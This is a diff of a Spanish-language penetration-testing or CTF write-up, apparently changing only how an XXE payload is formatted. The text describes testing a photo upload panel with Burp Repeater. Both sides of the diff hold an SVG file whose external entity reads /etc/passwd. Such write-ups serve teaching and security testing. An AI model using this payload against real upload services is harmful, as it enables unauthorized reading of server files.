@@ -45,17 +45,13 @@ Ahora desde el navegador y con el proxy de burp activado podemos ver el contenid
 Tenemos un panel en el que podemos subir fotografías. Vamos a analizar esta petición más comodamente en el repeater para ver si podemos inyectar código.
 Tras un par de pruebas, encontramos una forma de ejecutar una XXE Injection utilizando una imagen.svg 
 
-<pre>
-  <code>
-    ```xml
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-<text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
-
-  </code>
-</pre>
+<pre><code>
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;
+&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
+  &lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
 
 <img width="586" height="513" alt="010_photo" src="https://github.com/user-attachments/assets/f9a49f1b-a425-41a5-8a31-c78f1a36a744" />
 
